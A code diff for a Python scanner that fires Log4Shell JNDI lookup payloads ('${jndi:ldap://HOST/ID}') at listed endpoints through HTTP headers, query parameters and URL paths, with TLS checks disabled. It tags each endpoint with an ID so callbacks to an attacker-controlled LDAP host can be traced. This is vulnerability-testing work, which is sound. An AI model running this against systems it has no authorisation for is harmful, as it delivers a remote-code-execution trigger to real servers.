@@ -1,14 +1,22 @@
 import argparse
 import uuid
-import tests
 from termcolor import cprint
+import requests
+from urllib import parse
+
+# Disable insecure SSL warning
+import urllib3
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 TESTING_HOST = "localhost:1389"
 TESTING_PAYLOAD = "${jndi:ldap://HOST/ID}"
 OUTPUT_FILE = "ids.csv"
-TESTS_LIST = [("Headers", tests.test_header),
-              ("Query", tests.test_get),
-              ("Path", tests.test_path)]
+HEADERS = [
+    "user-agent",
+    "X-Api-Version",
+    "referer",
+    "x-forwarded-for"
+]
 
 
 def get_arguments():
@@ -52,7 +60,11 @@ def get_arguments():
                         action="store_true",
                         dest="verbose",
                         help="verbose logging")
-    test_group = parser.add_argument_group("Tests")
+    parser.add_argument("--headers-file",
+                        action="store",
+                        dest="headers",
+                        help="file with a list of header to test")
+    test_group = parser.add_argument_group("Tests", "[default: Headers, Query, Path]")
     test_group.add_argument("--headers",
                             action="append_const",
                             dest="tests",
@@ -74,6 +86,17 @@ def get_arguments():
     return args
 
 
+def read_file_rows(file):
+    rows = []
+    with open(file, "r") as f:
+        for i in f.readlines():
+            i = i.strip()
+            if i == "" or i.startswith("#"):
+                continue
+            rows.append(i)
+    return rows
+
+
 def get_entries(filename):
     with open(filename) as file:
         lines = file.readlines()
@@ -93,11 +116,13 @@ def generate_mappings(endpoints):
     return [(endpoint, generate_endpoint_id(endpoint)) for endpoint in endpoints]
 
 
-def test_entry(endpoint, payload, id, timeout):
+def test_entry(endpoint, payload, id, args):
     cprint(f"[*] [ID: {id}] Testing endpoint {endpoint}", "green")
+    if args.verbose:
+        cprint(f" [%] Payload: {testing_payload}", color="cyan")
     for test_key, test_fun in TESTS_LIST:
         try:
-            test_fun(endpoint, payload, timeout)
+            test_fun(endpoint, payload, args)
         except Exception as e:
             cprint(f" [!] [{test_key}] Test failed with: {e}", color="red")
 
@@ -105,6 +130,10 @@ def test_entry(endpoint, payload, id, timeout):
 def get_endpoints_from_entries(entries, http, https):
     endpoints = []
     for entry in entries:
+        if entry.startswith("http://") or entry.startswith("https://"):
+            endpoints.append(entry)
+            break
+
         if http:
             endpoints.append("http://" + entry)
         if https:
@@ -118,12 +147,38 @@ def get_endpoints_from_entries(entries, http, https):
 def log_mappings(mappings):
     cprint(f"[*] Endpoint-ID mapping (exported in {OUTPUT_FILE}):", color="cyan", attrs=["bold", "underline"])
     for endpoint, id in mappings:
-        cprint(f" - {endpoint} -> {id}", color="blue")
+        cprint(f" - {endpoint} -> {id}", color="white")
 
 
 def generate_mapping_file(mappings, output):
     with open(output, "w") as f:
         f.writelines([f"{id},{endpoint}\n" for endpoint, id in mappings])
+
+
+# Tests
+def test_header(endpoint, payload, args):
+    if args.headers is not None:
+        headers = read_file_rows(args.headers)
+    else:
+        headers = HEADERS
+
+    headers = {header: payload for header in headers}
+    requests.get(endpoint, headers=headers, verify=False, timeout=args.timeout)
+
+
+def test_get(endpoint, payload, args):
+    params = {"id": payload}
+    requests.get(endpoint, params=params, verify=False, timeout=args.timeout)
+
+
+def test_path(endpoint, payload, args):
+    url = parse.urljoin(endpoint, parse.quote(payload, safe=''))
+    requests.get(url, verify=False, timeout=args.timeout)
+
+
+TESTS_LIST = [("Headers", test_header),
+              ("Query", test_get),
+              ("Path", test_path)]
 
 
 # MAIN
@@ -144,6 +199,4 @@ if __name__ == '__main__':
     cprint("[*] Start testing", color="magenta", attrs=["bold", "underline"])
     for endpoint, id in mappings:
         testing_payload = build_testing_payload(id, args.host, args.payload)
-        if args.verbose:
-            cprint(f" [%] Payload: {testing_payload}", color="cyan")
-        test_entry(endpoint, testing_payload, id, args.timeout)
+        test_entry(endpoint, testing_payload, id, args)
